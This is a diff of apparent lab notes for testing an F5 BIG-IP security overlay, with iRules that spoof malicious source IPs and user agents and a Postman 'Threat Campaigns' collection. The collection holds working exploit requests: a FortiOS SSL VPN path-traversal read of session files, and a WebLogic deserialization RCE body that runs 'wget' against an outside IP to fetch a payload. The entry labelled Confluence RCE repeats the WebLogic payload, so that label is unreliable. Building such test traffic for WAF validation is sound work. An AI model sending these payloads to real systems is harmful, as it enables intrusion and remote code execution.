@@ -1,10 +1,14 @@
-IPI Overlay Virtual Server (10.1.10.146) - update UDF interface for .146
+IPI Overlay Virtual Server (10.1.10.146) 
+name: security-testing-overlay-vs
+(http profile, client/server ssl profile, no snat, malicious_ips_dg
+- update UDF interface for .146
 
 
 On BIG-IP
 ipi_tester iRule
 
 when CLIENT_ACCEPTED {
+#ipi_tester
 # Pulls a SNAT from a Data Group of pre-defined data group "dg_malicious_ips”
 set badip_index [expr int(rand()*6)]
 set badip [class element -name $badip_index malicious_ips_dg]
@@ -18,6 +22,28 @@ set badip [class element -name $badip_index malicious_ips_dg]
 
 IPI Data Group
 create /ltm data-group internal malicious_ips_dg type string records add { 134.119.218.243 { data SpamSource } 42.231.162.22 { data BotNet } 42.231.162.217  { data SpamSource } 177.101.224.90 { data Scanners } 218.17.228.102 { data SpamSource } 220.169.127.172 { data Scanner } 218.26.54.33 { data static }}
+
+UA Data Group
+create /ltm data-group internal malicious_ua_dg type string records add { agent0 { data minibot } agent1 { data IE8 } agent2 { data IE9 } agent3 { data IE10 } agent4 { data Chrome } agent5 { data Firefox } agent6 { data Safari } agent7 { data iPhone4 } agent8 { data iPhone5 } agent9 { data Android } }
+
+UA iRule:
+#ua_tester
+when HTTP_REQUEST {
+  # Randomly pick a user agent from data group called "my_agents".
+  # If you want to weight a particular agent, enter it multiple times in the data group .
+  # Make sure you change the randomization number if you change the number of entries in the data group.
+
+set my_index [expr int(rand()*10)]
+set user_agent [class element -value $my_index malicious_ua_dg]
+  	HTTP::header replace user-Agent $user_agent
+}
+
+
+
+
+
+
+
 
 
 On Client
@@ -39,3 +65,234 @@ while sleep 1; do xargs curl -k -l < curl_args.txt; done > /dev/null
 
 chmod +x ipi_tester 
 ./ipi_tester
+
+
+
+
+
+Add to Postman:
+TC Collection
+
+{
+	"info": {
+		"_postman_id": "3b545952-324d-41c5-9f2e-90b382adf4d4",
+		"name": "Threat Campaigns",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Fortinet SSL VPN FortiOS file read - python",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Host",
+						"value": "10.1.10.145",
+						"type": "text"
+					},
+					{
+						"key": "Connection",
+						"value": "keep-alive",
+						"type": "text"
+					},
+					{
+						"key": "Accept-Encoding",
+						"value": "gzip, deflate",
+						"type": "text"
+					},
+					{
+						"key": "Accept",
+						"value": "*/*",
+						"type": "text"
+					},
+					{
+						"key": "User-Agent",
+						"value": "python-requests/2.18.4",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "https://10.1.10.145/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession/ HTTP/1.1\n",
+					"protocol": "https",
+					"host": [
+						"10",
+						"1",
+						"10",
+						"145"
+					],
+					"path": [
+						"remote",
+						"fgt_lang"
+					],
+					"query": [
+						{
+							"key": "lang",
+							"value": "/../../../..//////////dev/cmdb/sslvpn_websession/ HTTP/1.1\n"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Oracle2 WebLogic async Deserialization RCE - test2725 Copy",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Host",
+						"value": " 10.1.10.145",
+						"type": "text"
+					},
+					{
+						"key": "User-Agent",
+						"value": " Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36",
+						"type": "text"
+					},
+					{
+						"key": "Accept-Encoding",
+						"value": " gzip, deflate",
+						"type": "text"
+					},
+					{
+						"key": "Accept",
+						"value": " */*",
+						"type": "text"
+					},
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/xml",
+						"type": "text"
+					},
+					{
+						"key": "Connection",
+						"value": " Keep-Alive",
+						"type": "text"
+					},
+					{
+						"key": "Content-Length",
+						"value": " 748",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "\\n<soapenv:Envelope xmlns:soapenv=%22http://schemas.xmlsoap.org/soap/envelope/%22 xmlns:wsa=%22http://www.w3.org/2005/08/addressing%22 xmlns:asy=%22http://www.bea.com/async/AsyncResponseService%22>   \\n<soapenv:Header> \\n<wsa:Action>xx</wsa:Action>\\n<wsa:RelatesTo>xx</wsa:RelatesTo>\\n<work:WorkContext xmlns:work=%22http://bea.com/2004/06/soap/workarea/%22>\\n<void class=%22java.lang.ProcessBuilder%22>\\n<array class=%22java.lang.String%22 length=%223%22>\\n<void index=%220%22>\\n<string>/bin/bash</string>\\n</void>\\n<void index=%221%22>\\n<string>-c</string>\\n</void>\\n<void index=%222%22>\\n<string>wget http://51.15.56.161:21/test2725</string>\\n</void>\\n</array>\\n<void method=%22start%22/></void>\\n</work:WorkContext>\\n</soapenv:Header>\\n<soapenv:Body>\\n<asy:onAsyncDelivery/>\\n</soapenv:Body></soapenv:Envelope>\\n",
+					"options": {
+						"raw": {
+							"language": "xml"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://10.1.10.145/_async/AsyncResponseServiceHttps",
+					"protocol": "https",
+					"host": [
+						"10",
+						"1",
+						"10",
+						"145"
+					],
+					"path": [
+						"_async",
+						"AsyncResponseServiceHttps"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Atlassian Confluence Widget Connector RCE - mysqlcurl",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Host",
+						"value": " 10.1.10.145",
+						"type": "text"
+					},
+					{
+						"key": "User-Agent",
+						"value": " Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36",
+						"type": "text"
+					},
+					{
+						"key": "Accept-Encoding",
+						"value": " gzip, deflate",
+						"type": "text"
+					},
+					{
+						"key": "Accept",
+						"value": " */*",
+						"type": "text"
+					},
+					{
+						"key": "Content-Type",
+						"value": " text/plain",
+						"type": "text"
+					},
+					{
+						"key": "Connection",
+						"value": " Keep-Alive",
+						"type": "text"
+					},
+					{
+						"key": "Content-Length",
+						"value": " 748",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "\\n<soapenv:Envelope xmlns:soapenv=%22http://schemas.xmlsoap.org/soap/envelope/%22 xmlns:wsa=%22http://www.w3.org/2005/08/addressing%22 xmlns:asy=%22http://www.bea.com/async/AsyncResponseService%22>   \\n<soapenv:Header> \\n<wsa:Action>xx</wsa:Action>\\n<wsa:RelatesTo>xx</wsa:RelatesTo>\\n<work:WorkContext xmlns:work=%22http://bea.com/2004/06/soap/workarea/%22>\\n<void class=%22java.lang.ProcessBuilder%22>\\n<array class=%22java.lang.String%22 length=%223%22>\\n<void index=%220%22>\\n<string>/bin/bash</string>\\n</void>\\n<void index=%221%22>\\n<string>-c</string>\\n</void>\\n<void index=%222%22>\\n<string>wget http://51.15.56.161:21/test2725</string>\\n</void>\\n</array>\\n<void method=%22start%22/></void>\\n</work:WorkContext>\\n</soapenv:Header>\\n<soapenv:Body>\\n<asy:onAsyncDelivery/>\\n</soapenv:Body></soapenv:Envelope>\\n",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://10.1.10.145/_async/AsyncResponseServiceHttps",
+					"protocol": "https",
+					"host": [
+						"10",
+						"1",
+						"10",
+						"145"
+					],
+					"path": [
+						"_async",
+						"AsyncResponseServiceHttps"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "test_req",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://10.1.10.145/WebGoat/login",
+					"protocol": "https",
+					"host": [
+						"10",
+						"1",
+						"10",
+						"145"
+					],
+					"path": [
+						"WebGoat",
+						"login"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
+
+
